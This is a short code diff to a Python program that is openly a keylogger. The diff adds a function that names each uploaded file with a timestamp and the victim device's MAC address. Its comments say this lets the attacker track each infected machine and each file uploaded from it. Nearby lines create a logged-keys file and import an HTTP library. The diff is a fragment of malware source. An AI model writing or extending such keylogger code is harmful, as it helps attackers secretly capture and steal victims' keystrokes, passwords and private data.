@@ -4,6 +4,14 @@ import re
 from typing import IO
 import requests
 import uuid
+import time
+
+#Create a filename based off the current timestamp and the infected device's MAC address
+#The name is in the format timestamp MAC address
+#This allows the attacker to identify each infected and each uploaded file per infected
+def generate_file_name()-> str:
+    time_stamp = time.strftime('%Y-%m-%d %H:%M:%S', time.localtime())
+    return str(time_stamp+" "+str(uuid.getnode()))
 
 def create_logged_keys_file(path:str, file_name:str)->IO:
     file_path = os.path.join(path, file_name)
